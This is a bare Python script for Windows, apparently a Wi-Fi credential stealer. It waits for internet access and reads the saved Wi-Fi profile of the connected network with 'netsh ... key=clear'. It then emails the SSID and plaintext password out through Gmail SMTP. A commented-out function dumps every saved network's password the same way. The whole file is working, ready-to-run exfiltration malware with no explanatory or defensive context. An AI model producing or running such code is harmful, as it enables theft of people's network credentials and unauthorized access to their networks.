import subprocess
import re
import smtplib
from email.message import EmailMessage
import urllib.request

def stay_running():
    send = True
    has_internet = True
    while True:
        try:
            urllib.request.urlopen("http://google.com")
            print("Connected!")
            has_internet = True
            if send and has_internet:
                #find_all()
                find_current_connected_wifi()
                send = False
        except:
            send = True
            has_internet = False
            print("No Internet!")

def get_connected_network_name():
    conntected_wifi_name_command = subprocess.run(["netsh", "wlan", "show", "interface"], capture_output = True).stdout.decode()
    profile_name = (re.findall("Profile                : (.*)\r", conntected_wifi_name_command))
    return profile_name[0].strip()

def send_email(content):
    # Create EmailMessage Object
    email = EmailMessage()
    email["from"] = "Name"
    email["to"] = "Email"
    email["subject"] = "WiFi SSIDs and Passwords"
    email.set_content(content)

    # Create smtp server
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login("Email", "Password")
        smtp.send_message(email)   

def find_all():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    wifi_list = list()

    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = dict()
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)

    email_message = ""
    for item in wifi_list:
        email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
    send_email(email_message)

      
def find_current_connected_wifi():
        wifi_profile = dict()
        wifi_profile['ssid'] = get_connected_network_name()
        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", get_connected_network_name(), "key=clear"], capture_output = True).stdout.decode()
        password = re.search("Key Content            : (.*)\r", profile_info_pass)
        if password == None:
            wifi_profile["password"] = None
        else:
            wifi_profile["password"] = password[1]
        email_message = f"SSID: {wifi_profile['ssid']}, Password: {wifi_profile['password']}"
        send_email(email_message)

stay_running()
